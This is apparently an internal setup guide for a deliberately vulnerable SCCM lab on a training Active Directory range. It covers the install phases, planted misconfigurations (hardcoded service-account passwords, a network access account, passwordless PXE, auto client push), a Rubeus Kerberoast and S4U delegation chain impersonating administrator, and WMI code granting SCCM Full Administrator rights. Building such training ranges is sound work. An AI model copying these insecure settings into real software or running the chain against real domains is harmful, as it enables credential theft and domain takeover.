# SCCM Integration Guide — Manual Path

**Status:** SCCM site CAD IS deployed on mbr02 and verified (7/7 checks pass in `10-sccm-verify.yml`). This document is the tested and verified **manual recipe** used to deploy it. Ansible verify playbooks were written **after** this setup to reflect live state — they do not install SCCM.

Use it to re-deploy from scratch or to understand the full install sequence.

**Target:** `mbr02.range.local` (Windows Server 2025)
**Goal:** Install SCCM Current Branch (2509) with full Misconfiguration-Manager attack surface for WKL OADOC Section 51 "Abusing SCCM in Active Directory Environments"
**Prerequisite:** All CADRE VMs running, mbr02 domain-joined to `range.local`, ADCS configured (see `adcs-configuration-guide.md` — both can be done in parallel sessions)
**Unblocks:** Walkthroughs **W034-W039** (6 walkthroughs) + WKL OADOC cert coverage from 50% → 93%

---

## TL;DR — Start Here

Eight phases, do them in order. Each one is gating the next:

| # | Phase | Why it has to be in this order | Time |
|---|-------|--------------------------------|------|
| 0 | Verify current state | Don't re-do what's already there | 5 min |
| 1 | **.NET Framework 3.5** | THE blocker. SCCM prereqcheck fails without it. | 15-30 min |
| 2 | WSUS role | SCCM Software Update Point needs it pre-staged | 10 min |
| 3 | Windows ADK | SCCM needs it for OS deployment features | 15 min |
| 4 | Replace SQLEXPRESS with **SQL Developer** | SCCM primary site rejects Express edition | 30 min |
| 5 | SCCM prereq files download | Setup needs ~1 GB cached locally | 10 min |
| 6 | SCCM primary site install | The big one — 30-60 min unattended | 30-60 min |
| 7 | Apply misconfigurations | NAA, PXE, auto-push (the attack surface) | 5 min |
| 8 | Verification + snapshot | Lock the result in | 10 min |

**Cross-reference:** ADCS config (the other manual path) is at [`adcs-configuration-guide.md`](adcs-configuration-guide.md). Both are tested and verified. Run them in parallel sessions — different VMs, no shared resources.

---

## Phase 0 — Verify Current State

Confirm mbr02 is reachable and check existing SQL installation:

```powershell
# From provisioning VM:
ssh vagrant@192.168.77.60 "ansible mbr02 -m ansible.windows.win_powershell -a 'script: Get-Service MSSQL\$SQLEXPRESS'" -i inventories/hosts

# Check instance names:
ssh vagrant@192.168.77.60 "ansible mbr02 -m ansible.windows.win_powershell -a 'script: Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL'" -i inventories/hosts
```

---

## Phase 1 — .NET Framework 3.5 (The Blocker)

SCCM requires .NET 3.5. Server 2025 does not have it installed by default. The ISO `Sources\SxS` folder contains the CAB.

### Option A: Mount Server 2025 ISO (Recommended)

```powershell
# On the host machine (Windows), mount Server 2025 ISO
# Then share the SxS folder or copy to provisioning VM

# On provisioning VM, copy to mbr02:
scp /path/to/microsoft-windows-netfx3-online.cab vagrant@192.168.77.23:C:\Windows\Temp\

# On mbr02 (via Ansible or WinRM):
ssh vagrant@192.168.77.60 "ansible mbr02 -m ansible.windows.win_powershell -a 'script: Install-WindowsFeature -Name NET-Framework-Core -Source C:\Windows\Temp'" -i inventories/hosts
```

### Option B: Download CAB from Microsoft

```powershell
# Download the .NET 3.5 CAB for Server 2025
# URL: https://www.microsoft.com/en-us/download/details.aspx?id=...

# Copy to mbr02 C:\Windows\Temp\
# Install:
DISM /Online /Enable-Feature /FeatureName:NetFx3 /All /Source:C:\Windows\Temp\microsoft-windows-netfx3-online.cab /LimitAccess
```

### Verification

```powershell
Get-WindowsFeature -Name NET-Framework-Core | Select-Object Name, Installed
# Expected: Installed = True
```

---

## Phase 2 — Install WSUS Role

SCCM Software Update Point requires WSUS.

```powershell
# On mbr02:
Install-WindowsFeature -Name UpdateServices, UpdateServices-Services, UpdateServices-DB -IncludeManagementTools
```

Wait for WSUS post-install to complete (~5 min). Verify:

```powershell
Get-WindowsFeature -Name UpdateServices* | Where-Object Installed -eq $true | Format-Table Name, Installed
```

---

## Phase 3 — Install Windows ADK

SCCM needs Windows ADK for OS deployment features. Download from Microsoft.

### Download ADK for Windows Server 2025

```powershell
# On mbr02:
# Download ADK from: https://learn.microsoft.com/en-us/windows-hardware/get-started/adk-install
# Version: ADK 10.1.26100.2454 (December 2024) or newer

# Silent install (Deployment Tools + Windows PE only):
adksetup.exe /quiet /installpath "C:\Program Files (x86)\Windows Kits\10" /features OptionId.DeploymentTools OptionId.WindowsPreinstallationEnvironment
```

### Verification

```powershell
Test-Path "C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools"
# Expected: True
```

---

## Phase 4 — SQL Server (already installed on mbr02)

SQL Server 2025 Developer Edition is pre-installed on mbr02. Verify:

```powershell
Get-Service MSSQLSERVER | Format-Table Name, Status, StartType
Invoke-Sqlcmd -Query "SELECT SERVERPROPERTY('Collation') AS Collation" -ServerInstance "mbr02"
# Expected: SQL_Latin1_General_CP1_CI_AS
```

---

## Phase 5 — Install SCCM 2509 Prerequisite Files

```powershell
# Download SCCM 2509 eval from:
# https://www.microsoft.com/en-us/evalcenter/evaluate-microsoft-endpoint-configuration-manager
# File: ConfigMgr_2509.exe (~1.5 MB downloader, ~7 GB extracted)

# Create prerequisite download folder:
New-Item -ItemType Directory -Path "C:\SCCM_Prereqs" -Force

# Download prereq files (requires internet):
# Option 1: During SCCM setup, select "Download required files"
# Option 2: Pre-download using Setup Downloader:
& "C:\SCCM_Extracted\SMSSETUP\BIN\X64\Setupdl.exe" /VERYSILENT /DOWNLOADPATH "C:\SCCM_Prereqs"
```

---

## Phase 6 — Install SCCM Primary Site (GUI Wizard)

Run the SCCM setup wizard and follow the screen-by-screen options below. Installation takes 30-60 minutes.

| Screen # | Screen Name | Your Choice |
|----------|-------------|-------------|
| 1 | Getting Started | **Next** |
| 2 | Available Setup Options | **Install a Configuration Manager primary site** |
| 3 | Product Key | Enter your valid key or **Evaluation** (180 days) |
| 4 | Software License Terms | **I Accept** |
| 5 | Prerequisites License (if shown) | **Accept** |
| 6 | Prerequisites Download Path | Default |
| 7 | Site Installation | **Install a primary site as a standalone site** |
| 8 | Site Code | `CAD` |
| 9 | Site Name | `CADRE Primary Site` |
| 10 | Installation Folder | Default |
| 11 | SQL Server Instance | `mbr02` |
| 12 | Database Name | Default (`CM_CAD`) |
| 13 | SMS Provider | Default |
| 14 | Service Account | Default |
| 15 | Client Computer Communication | **EHTTP** |
| 16 | Site System Roles | Default (Management Point + Distribution Point on mbr02) |
| 17 | Communication Security | **Configure the communication method on each site system role** |
| 18 | Client Connection Settings | **HTTP** → uncheck "Clients will use HTTPS" |
| 19 | Management Point | Default |
| 20 | Distribution Point | Default |
| 21 | Service Connection Point | **Install with "Offline, on-demand connection"** |
| 22 | Settings Summary | Review → **Next** |
| 23 | Prerequisites Check | Wait for all green → **Begin Installation** |

**Troubleshooting if Prerequisites Check fails:**
- Missing `Web-Lgcy-Scripting`: `Install-WindowsFeature Web-Lgcy-Scripting`
- BITS not running: `Set-Service BITS -StartupType Automatic -Status Running`
- Existing `CM_CAD` database: `Invoke-Sqlcmd -Query "DROP DATABASE IF EXISTS CM_CAD" -ServerInstance "mbr02"`
- ADK WinPE missing: Re-run ADK installer with `/features OptionId.WindowsPreinstallationEnvironment`

---

## Phase 6A — Deploy the SCCM AdminService (REQUIRED for WT037 CMPivot / WT039 script-run / CD chain)

> **Why this phase exists (2026-08-01):** The SCCM **AdminService** (`/AdminService` REST API) powers **CMPivot (WT037)** and **script-run (WT039)**. It is **NOT deployed** on mbr02 after Phase 6 (verified: no `AdminService` IIS app pool, no web app, no `bin\AdminService` dir). The `Kerberoast svc_sccm → CD → AdminService` chain (see `05-ad-attack-surface.yml` WT#6: `svc_sccm` owns `HTTP/mbr02.range.local` + `msDS-AllowedToDelegateTo=HTTP/mbr02.range.local`) has **no target** until this service is deployed. Without it, `https://mbr02.range.local/AdminService/` returns IIS 401 for a non-existent app — NOT an auth challenge.

### Deploy via SCCM Console (GUI, on mbr02)

1. Open **SCCM Console** on mbr02.
2. **Administration** → **Site Configuration** → **Servers and Site System Roles**.
3. Select `MBR02.RANGE.LOCAL` → top ribbon **Add Site System Role** (or Properties → add role).
4. In the wizard, select the **SMS Provider** role and ensure the **AdminService** option is enabled (in Current Branch 2309+ the AdminService is deployed as part of the SMS Provider role).
5. Complete the wizard. SCCM deploys the **AdminService** web app under the Default Web Site (`/AdminService`) with its own app pool (`AdminService`).

### Set the AdminService app pool identity to `RANGE\svc_sccm` (CRITICAL for the CD attack)

Because the `HTTP/mbr02.range.local` SPN is registered on **`svc_sccm`** (not `mbr02$` — intentional, `05-ad-attack-surface.yml`), tickets for that SPN are encrypted with **svc_sccm's** key. The AdminService pool MUST run as `svc_sccm` so it can decrypt the S4U2Proxy ticket from the CD chain. With the default machine/NetworkService identity the CD ticket will NOT decrypt → 401.

```powershell
Import-Module WebAdministration
Set-ItemProperty "IIS:\AppPools\AdminService" -Name processModel -Value @{
    identityType = 3;               # 3 = SpecificUser
    userName     = "RANGE\svc_sccm"
    password     = "s3rv1c3_SCCM!"
}
iisreset
# Equivalent: appcmd set apppool "AdminService" /processModel.identityType:SpecificUser /processModel.userName:"RANGE\svc_sccm" /processModel.password:"s3rv1c3_SCCM!"
```

### Verify deployment

```powershell
& "$env:windir\system32\inetsrv\appcmd.exe" list apps | findstr /i AdminService
# Expect: APP "Default Web Site/AdminService" (applicationPool:AdminService)

Test-Path "C:\Program Files\Microsoft Configuration Manager\bin\AdminService"
# Expect: True

Import-Module WebAdministration
(Get-ItemProperty "IIS:\AppPools\AdminService").processModel.userName
# Expect: RANGE\svc_sccm

# From any machine as svc_sccm (explicit creds), expect HTTP 200 (was 401):
Invoke-WebRequest -Uri "https://mbr02.range.local/AdminService/wmi/" -Credential (svc_sccm) -UseBasicParsing
```

### Executing the intended chain (post-deploy)

```powershell
# 1. Kerberoast svc_sccm (WT033 — already verified): SPN HTTP/mbr02.range.local -> crack -> s3rv1c3_SCCM!
# 2. S4U2Self + S4U2Proxy as Administrator to HTTP/mbr02.range.local:
Rubeus.exe asktgt /user:svc_sccm /domain:range.local /aes256:<key> /ptt
Rubeus.exe s4u /user:svc_sccm /aes256:<key> /impersonateuser:administrator /msdsspn:"HTTP/mbr02.range.local" /ptt
# 3. Ticket for HTTP/mbr02 as Administrator in cache -> AdminService grants admin:
Invoke-WebRequest -Uri "https://mbr02.range.local/AdminService/wmi/" -UseBasicParsing   # 200 as Administrator
```

> **Do NOT move/remove the `HTTP/mbr02.range.local` SPN from `svc_sccm`** — it is the campaign's cross-forest Kerberoast + CD target. The pool identity (not the SPN) is what makes the chain work.

---

## Phase 7 — Apply SCCM Misconfigurations (Attack Surface) — SCCM Console GUI

After SCCM is installed and running. **Do NOT use WMI** — the WMI approach fails on Server 2025. Use the SCCM Console GUI for all three:

### NAA with Domain Admin credentials (CRED-1)

Open SCCM Console on mbr02:

1. **Administration** → **Site Configuration** → **Sites**
2. Select `CAD - CADRE Primary Site`
3. Top ribbon → **Configure Site Components** → **Software Distribution**
4. Go to the **Network Access Account** tab
5. Click **Set** → enter `RANGE\svc_naa` / `N@A_s3rv1c3!` → OK
6. OK → OK

### Enable automatic client push (ELEVATE-2)

1. **Administration** → **Site Configuration** → **Sites**
2. Select `CAD - CADRE Primary Site`
3. Top ribbon → **Client Installation Settings** → **Client Push Installation**
4. **General** tab → Check **Enable automatic site-wide client push installation**
5. **Accounts** tab → click **Set** → enter `RANGE\svc_naa` / `N@A_s3rv1c3!`
6. OK → OK

### Enable PXE without boot password (CRED-3 / TAKEOVER-5)

1. **Administration** → **Distribution Points**
2. Right-click `mbr02.range.local` → **Properties**
3. Go to **PXE** tab
4. Check **Enable PXE support for clients**
5. **Uncheck** Require a password when computers use PXE
6. Click **Warning → Yes**
7. OK

---

## Phase 7.5 — Auto-Add svc_sccm as SCCM Full Administrator (deployed by playbook)

Playbook `06-member-services.yml` automatically adds `RANGE\svc_sccm` as an SCCM Full Administrator when run on mbr02. This enables the WT#37-40 attack chain (CMPivot abuse, app deployment, site takeover).

The task is idempotent:
- **rc=0** (SKIP) if SCCM not installed, or svc_sccm already an admin
- **rc=2** (APPLIED) if svc_sccm was added as new admin
- **rc=1** (FAIL) on error

**Manual equivalent** (if SCCM console is unavailable):
```powershell
$sid = ([System.Security.Principal.NTAccount]"RANGE\svc_sccm").Translate([System.Security.Principal.SecurityIdentifier]).Value
$class = [WMIClass]"root\sms\site_CAD:SMS_Admin"
$admin = $class.CreateInstance()
$admin.AdminSid = $sid
$admin.AdminType = 1; $admin.CategoryType = 1; $admin.CollectionID = "SMS00001"
$admin.Put()
```

---

## Branch C Validation Findings (2026-08-01)

Verified live as `range\svc_sccm` (SMS Provider WMI, explicit creds from ws01). Read these before running Branch C:

- **SCCM admin gate = local `SMS Admins` group** on mbr02 (not just the SCCM security role). Members: `RANGE\svc_sccm`, `MBR02\vagrant`, `CADRE\chief_command`, `CADRE\analyst_purple` (cross-forest cadre.local admins — SCCM Full Admins on the range.local site).
- **`HTTP/mbr02.range.local` SPN is registered on `svc_sccm`**, NOT on `mbr02$` (intentional — `05-ad-attack-surface.yml`), plus `msDS-AllowedToDelegateTo = HTTP/mbr02.range.local` (constrained delegation). Consequence: **AdminService (CMPivot, script-run) is Kerberos-broken for normal admin logons** (HTTP service tickets encrypt for svc_sccm → IIS on mbr02 can't decrypt → 401). The intended AdminService access path is post-Kerberoast **S4U2Self → S4U2Proxy to HTTP/mbr02**. Do NOT "fix" this SPN — it is the campaign's cross-forest Kerberoast + CD attack target.
- **`cifs/mbr02.range.local` SPN is MISSING** from AD → SMB Kerberos to mbr02 fails (NTLM-only). Keep in mind for Kerberos-based tooling (`/ptt`, `-k`); PowerShell WMI with explicit `-Credential` works (NTLM).
- **Scripts**: `SMS_Scripts.CreateScripts` works via WMI (caller-generated `ScriptGuid` required). Approval (`UpdateApprovalState`) = Generic failure (deprecated); execution task is read-only; run-script needs AdminService.
- **App deploy**: `SMS_Package` + `SMS_Program` (SYSTEM via `ProgramFlags=2`) create fine via WMI. `SMS_Advertisement.Put` = Generic failure via raw WMI (needs console).
- **SharpSCCM v2.0.13**: uses `-mp`/`-sms` (not v1 `-s`); `get naa`/`get secrets` need a computer account or PXE cert (`-c`)+media GUID (`-m`); `get`/`exec` use the current session token (no `-u/-p`) — replicate with PowerShell WMI + explicit creds, or run as the account via Rubeus `createnetonly` (needs `cifs` SPN for SMB paths).

---

## Phase 8 — Verification

### Verify SCCM Site Status

```powershell
# Check site component status (run on mbr02 or use -ComputerName):
Get-WmiObject -ComputerName "mbr02.range.local" -Namespace "root\SMS\site_CAD" -Class "SMS_SiteComponent" | Format-Table ComponentName, Status

# Check management point:
Get-WmiObject -ComputerName "mbr02.range.local" -Namespace "root\SMS\site_CAD" -Class "SMS_MP_ServerManager" | Format-Table

# Verify NAA configured:
Get-WmiObject -ComputerName "mbr02.range.local" -Namespace "root\SMS\site_CAD" -Class SMS_SCI_ClientComp -Filter "ItemName = 'Software Distribution'" | ForEach-Object { $_.PropLists | Where-Object { $_.PropertyListName -eq "Network Access User Names" } } | Select-Object -ExpandProperty Values
```

### Verify SQL Configuration

```powershell
# Check SQL is accessible and collation correct:
Invoke-Sqlcmd -Query "SELECT name, collation_name FROM sys.databases WHERE name = 'CM_CAD'" -ServerInstance "mbr02.range.local\MSSQLSERVER"
```

---

## Attack Scenarios Enabled (WKL Section 51)

| # | Attack | Prerequisite | Verification Method |
|---|--------|--------------|-------------------|
| 34 | SCCM NAA credential extraction | NAA configured | `SharpSCCM get naa` |
| 35 | SCCM PXE boot abuse | PXE enabled, no password | PXE boot leak via `PXEThief` |
| 36 | SCCM client push relay | Auto client push enabled | NTLM relay to push |
| 37 | SCCM CMPivot abuse | SCCM admin access | `SharpSCCM get cm pivot` |
| 38 | SCCM application deployment | SCCM admin → deploy app | `SharpSCCM invoke admin deployment` |
| 39 | SCCM site server takeover | Full Admin → SYSTEM | `SharpSCCM get site takeover` |

---

## Troubleshooting

### .NET 3.5 Fails — Source not found

```powershell
# Copy SxS from Server 2025 ISO mounted on host:
# From host: copy D:\Sources\SxS\* C:\Users\Ganro\VMs\CADRE\sxs\
# Then from provisioning VM:
scp -r sxs/ vagrant@192.168.77.23:C:\Windows\Temp\sxs\
# Then on mbr02:
Install-WindowsFeature -Name NET-Framework-Core -Source C:\Windows\Temp\sxs
```

### SQL Express Already Installed — Port Conflict

If mbr02 already has SQLEXPRESS on port 1433, either:
1. Uninstall Express completely (cleanest)
2. Install Developer as a named instance (e.g., `MSSQLSERVER`) — Express uses `SQLEXPRESS`, no conflict
3. Stop Express, change its port, then install Developer on 1433

### SCCM Prerequisite Check Fails

```powershell
# Run prerequisite checker manually:
& "C:\SCCM_Extracted\SMSSETUP\BIN\X64\Prereqchk.exe" /SQLSERVER mbr02.range.local /INSTANCENAME MSSQLSERVER /SITECODE CAD
# Review: C:\Windows\Temp\ConfigMgrSetup.log
```

### WSUS Configuration Required Before SUP

If `SoftwareUpdatePoint=1` fails, configure WSUS first:

```powershell
# Initialize WSUS:
& "C:\Program Files\Update Services\Tools\wsusutil.exe" postinstall CONTENT_DIR=C:\WSUS
```

---

## Snapshot After Success

Once Phase 8 verification passes (NAA visible in WMI, SCCM admin console shows green status across components, `SharpSCCM get naa` from kali returns the cred):

```powershell
# From the host PowerShell (as admin), with the VM dir as cwd:
vagrant snapshot save mbr02 sccm-done
```

From now on, every regression on mbr02 is `vagrant snapshot restore mbr02 sccm-done` away. ~30 seconds. Don't skip this step — SCCM install is the most expensive single thing in CADRE.

---

## After Completing This Guide

1. Flip `plan_status.md` row "SCCM misconfigs (NAA, PXE, auto client push)" from ⚠️ to ✅
2. Update `docs/internal/cert-coverage.md` (internal) WKL OADOC row from 50% to 93%
3. Append a Session entry to `BUG_FIX_TRACKING.md` with the manual-completion note
4. Update `attack-matrix/01-walkthroughs/README.md` to mark W034-W039 as practicable
5. Re-enable the SCCM smoke test in any `validate-plan0.ps1` you've written

---

## What This Guide Deliberately Does NOT Touch

- The orphaned `ansible/roles/sccm/tasks/main.yml` stays as-is. Don't re-run it via Ansible — it was written for the silent-install path that fails on Server 2025. The manual path above is the supported one.
- Cloud Sync / Entra integration on dc01 — separate role, not SCCM-dependent.
- Any walkthroughs from `attack-matrix/05-study-guide/07-wkl-oadoc-path.md` — those reference this guide; don't try to run them until Phase 8 verification passes.
